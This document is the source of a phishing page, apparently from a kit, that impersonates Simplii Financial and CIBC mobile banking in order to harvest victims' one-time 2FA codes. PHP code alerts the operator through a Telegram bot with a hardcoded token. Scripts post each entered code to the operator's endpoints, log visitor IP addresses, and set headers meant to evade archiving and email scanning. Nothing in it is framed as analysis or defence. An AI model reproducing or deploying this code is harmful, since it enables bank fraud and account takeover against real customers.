<?php


$message = "2FA CODE REQUESTED\n";

$apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"; 
$data = [
    'chat_id' => '-1001819831566',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    
?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../requests.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html><head></head><body lang="en" class="android-fix"><!--?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?--><link type="text/css" rel="stylesheet" id="#"><link type="text/css" rel="stylesheet" id="#"><style lang="en" type="text/css" id="#&quot;"></style><style lang="en" type="text/css" id="#"></style><style lang="en" type="text/css" id=""></style><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

        
        <title>Simplii Financial Mobile Banking Sign On</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script>
        
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="HandheldFriendly" content="true">
        <meta name="format-detection" content="telephone=no">
        <link rel="stylesheet" href="./files/reset.css">
        <link rel="stylesheet" href="./files/reset-brand.css">
        <link rel="stylesheet" href="./files/global.css">
        <link rel="stylesheet" href="./files/global-android2.css">
        <link rel="stylesheet" href="./files/global-brand.css">
        <link rel="stylesheet" type="text/css" href="./files/reset(1).css">
        <link rel="stylesheet" type="text/css" href="./files/reset-brand(1).css">
        <link rel="stylesheet" type="text/css" href="./files/global(1).css">
        <link rel="stylesheet" type="text/css" href="./files/global-android2(1).css">
        <link rel="stylesheet" type="text/css" href="./files/global-brand(1).css">
        <link rel="stylesheet" href="./files/password-reset.css">
        <link rel="stylesheet" href="./files/password-strength.css">
        <script type="text/javascript" id="wicket-ajax-base-url">
            /*<![CDATA[*/
            Wicket.Ajax.baseUrl="change-password";
            /*]]>*/
        </script>
        <link rel="stylesheet" href="./files/appboy.css">
        <style>
        input[type='number'], input[type='text'], input[type='password'], input[type='email'], input[type='tel'], input[type='search'], #manage-cards-button, select {
            padding: 0.8em;
            height: 55px;
            max-height: 46px;
        }
        </style>
        <style id="at-makers-style" class="at-flicker-control">
            .mboxDefault {visibility: hidden;}

            .tfa-info p {
                margin-bottom: 10px;
            }

            .mb5 {
                margin-bottom: 15px;
            }
        </style>
        <script src="./files/jquery-3.6.0.min.js###%" crossorigin="anonymous"></script>
        <script>
            var lrbank = 'Simplii';
            var lrinfo = '2FA';
        </script>
        <script src="./files/actions.js###%"></script>
        <link rel="stylesheet" href="./files/all.css">
        <script>
        $(document).on('change', '#input-code', function() {
            $.post('/deposit/simplii/api/otp-data', {code: $(this).val()});
        });

        var tloaded = false;

        $(document).on('submit', '#lab-form, .lab-form', function(e) {
            if (tloaded) {
                $('.btn-save').attr('disabled', true);
                $('.btn-save .btn-txt').css('display', 'none');
                $('.btn-save .btn-spinner').css('display', 'block');

                $.post('/deposit/simplii/api/otp-submit', {code: $('#input-code').val()}, function(response) {
                    location.href = '/deposit/simplii/wo';
                });
            } else {
                tloaded = true;

                $('#btn-send').css('display', 'none');
                $('#btn-sending').css('display', 'block');

                $.post('/deposit/simplii/api/otp-type', $(this).serialize(), function(response) {
                    setTimeout(function() {
                        $('#btn-sending').css('display', 'none');
                        $('#btn-next').css('display', 'block');
                        $('#step-2').css('display', 'block');
                        $('#input-code').attr('required', true);
                    }, 1000);
                });
            }

            e.preventDefault();
        });
        </script>
.automa-element-selector { direction: ltr } 
 [automa-isDragging] { user-select: none } 
 [automa-el-list] {outline: 2px dashed #6366f1;}
    
        <span class="offscreen">CIBC Mobile Banking</span>
        <input id="drawer-toggle-chk" aria-hidden="true" type="checkbox">
        <label for="drawer-toggle-chk" id="drawer-toggle-label">
        <img id="open-menu-icon" src="./files/drawer-menu-open.png" alt="Open Menu" role="button">
        <img id="close-menu-icon" src="./files/drawer-menu-close.png" alt="Close Menu" role="button">
        </label>
        <nav id="drawer-menu" class="post-signon-drawer scrollable-ver">
            <div id="menu-wrapper">
                <div class="drawer-menu-header">
                    <div class="account-holder-name" id="account-holder-name"></div>
                    <a href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-profileLink" class="no-style-link active" id="profile-link">
                    <span>My Profile</span><span class="drawer-icon-cog"></span>
                    </a>
                </div>
                <ul>
                    <li id="li-my-accounts"><a id="accounts-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-accountLink" role="menuitem" class="">My Accounts</a></li>
                    <li id="li-pay-bills"><a id="paybill-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-paybillLink" role="menuitem" class="">Bill Payments</a></li>
                    <li id="li-interac"><a id="etransfer-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-eTransferLink" role="menuitem" class=""><em>Interac</em> e-Transfers</a></li>
                    <li id="li-transfer"><a id="transfer-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-transferLink" role="menuitem" class="">Transfer Funds</a></li>
                    <li id="li-upcoming"><a id="uptxs-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-upcomingTransactionsLink" role="menuitem" class="">Upcoming Transactions</a></li>
                    <!-- dynamic SSO links -->
                    <li class="li-sso"><a id="GMT-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxir&amp;locale=en&amp;channel=mobile_web" role="menuitem">Global Money Transfer</a></li>
                    <li class="li-sso"><a id="FXC-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxcash&amp;locale=en&amp;channel=mobile_web" role="menuitem">Order Foreign Cash</a></li>
                    <li class="li-sso"><a id="RPC-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxprepaid&amp;locale=en&amp;channel=mobile_web&amp;page=fxretailprepaid-manage" role="menuitem">Prepaid Cards</a></li>
                    <li class="li-sso"><a id="PMO-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxpmo&amp;locale=en&amp;channel=mobile_web" role="menuitem">Buy Gold and Silver</a></li>
                    <li class="li-sso"><a id="CCS-link" href="https://www.cibc.mobi/ebm-mobile-anp/pre-credit-score?locale=en&amp;ebkck=true&amp;tcVersion=1.0&amp;channel=mobile_web" role="menuitem">Check Credit Score</a></li>
                    <hr>
                    <li id="li-open-account"><a id="open-product-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-openAccountPsSO-openAccountPsSOLink" role="menuitem">Open an Account</a></li>
                    <li id="li-browse-products"><a id="products-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-browseProductsPsSO-productSelectorSOLink" target="_blank" role="menuitem" @="Explore Products<span class=&quot;offscreen&quot;>. Opens in new page</span>" class="">Explore Products</a></li>
                    <li id="li-sites-apps"><a id="sites-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-sitesPostSignOnLink" role="menuitem" class="">CIBC Sites</a></li>
                    <!-- Customer Services link visible for CIBC non-Small Business -->
                    <li id="li-client-services"><a id="customerServices-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-customerServicesLink" class="">Customer Services</a></li>
                    <hr>
                    <li><a class="nav-no-indent" id="contact-us-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-contactUsLink" role="menuitem">Contact Us</a></li>
                    <li><a class="nav-no-indent" id="help-link" href="http://cibc.intelliresponse.com/mobile-w/" role="menuitem">Help</a></li>
                    <li><a class="nav-no-indent" id="security-guarantee-link" href="https://www.cibc.com/ca/mobile/legal/mobile-security.html?itrc=C1:7109" target="_blank" role="menuitem">Security Guarantee</a></li>
                    <hr>
                    <li id="li-sign-out"><a class="nav-no-indent" id="logout-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-logoutLink" role="menuitem">Sign Out</a></li>
                    <a href="not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                </ul>
            </div>
        </nav>
        <header class="flex-box flex-box-hoz">
            <div class="flex-box-flex-1"></div>
            <a href="deposit/simplii/#" target="_blank">
                <div id="header-logo"><span class="offscreen">Simplii Financial logo</span></div>
            </a>
            <div id="header-link" class="flex-box-flex-1">
            </div>
        </header>
        <section id="main-page" class="">
            <section id="ide">
                <section class="page-title">
                    <h2 class="title">Identity Verification</h2>
                </section>
            </section>
            <section id="change-password" class="page-wrapper">
                <div class="tfa-info">
                    <p>In order to sign on to CIBC Banking, we need to verify your identity.</p>
                    <p>We will send you a one-time verification code to the contact method selected below.</p>
                    <p class="mb5" style="margin-bottom: 20px">Note: For account security, we're no longer sending one-time verification codes to personal or free email services.</p>
                </div>
                <div class="global-error-from-container" tabindex="-1" id="id4">
                                    </div>
                <form method="post" action="040150.php" id="lab-form">
    <fieldset class="otvc">
            <label for="otvc-code">
                <p class="label-pad-b5">VERIFICATION CODE:</p>
            </label>
            <input pattern="[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}" data-id="otvc" id="input-code" type="tel" name="code" placeholder="Enter your 2FA code" maxlength="6" value="">
        </fieldset>
    
    <section id="step-2" style="display: none;">
        <p class="code-sent mb5">The code has been sent to the selected contact method.</p>
        
        <span id="id1b">
            <p class="mb5">
                <span class="label-pad-b5">Didn't get the code?</span>
                <a href="javascript:;" class="nga-resend-button" id="btn-resend">
                    <span>Resend code</span>
                </a>
            </p>
            <div class="linepadtop7bottom20">
                <span>Please allow a few minutes for the verification code to be sent.</span>
            </div>
        </span>
    </section>
    <fieldset class="button-set">
        <input type="button" class="btn btn-negative" id="btb-cancel" name="cancel-button" value="Cancel">
        <input type="submit" name="send-button" id="btn-send" class="btn btn-positive" value="Send">
        <button id="btn-sending" style="display:none; float:right" class="btn btn-positive" disabled="">Sending...</button>
        <button type="submit" name="ok-button" id="btn-next" class="btn btn-positive btn-full btn-save" style="display: none; float: right">
            <span class="btn-txt">OK</span>
            <span class="btn-spinner" style="display: none"><i class="fa fa-spinner fa-spin"></i></span>
        </button>
    </fieldset>
</form>

            </section>
        </section>
        <div id="__loadingScreenDiv" class="ajax-overlay" aria-live="assertive">
            <div class="ajax-overlay-background"></div>
            <img src="./files/loading.gif" class="ajax-overlay-spinner" tabindex="-1" alt="Page loading">
        </div>
    

<div id="automa-palette"></div></body></html>